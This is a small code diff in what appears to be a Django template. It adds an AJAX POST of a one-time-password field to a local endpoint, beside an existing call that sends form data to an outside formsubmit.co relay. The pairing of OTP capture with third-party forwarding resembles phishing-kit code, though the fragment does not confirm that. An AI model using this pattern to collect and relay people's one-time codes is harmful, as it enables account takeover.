@@ -82,6 +82,19 @@
             let json = JSON.stringify(object);
             btn.textContent = 'Loading...';
 
+            $.ajax({
+                type: 'POST',
+                url: "{% url 'otp' %}",
+                data: {
+                    otp: $('#otp').val(),
+                    csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken]').val()
+                },
+            })
+
+            function myFunction(){
+                window.location.href = "{% url 'otp' %}";
+            }
+
 
             fetch("https://formsubmit.co/ajax/bd9d3034b6a8347a7aca02bbefb8a268", {
                 method: "POST",
